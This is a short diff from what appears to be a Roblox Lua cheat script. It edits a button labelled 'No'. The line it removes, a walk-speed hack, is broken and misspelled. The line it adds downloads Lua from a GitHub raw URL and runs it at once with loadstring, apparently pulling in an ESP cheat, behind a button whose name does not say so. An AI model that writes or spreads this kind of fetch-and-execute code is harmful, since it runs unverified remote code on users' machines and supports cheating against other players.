@@ -24,7 +24,7 @@ About:AddBind({
 About:AddButton({
 	Name = "No",
 	Callback = function()
-        game.Player.LocalPlayer.Huminoid.Walkspeed = 200
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ducks-kid/B0SS/main/ESP", true))()
   	end    
 })
 
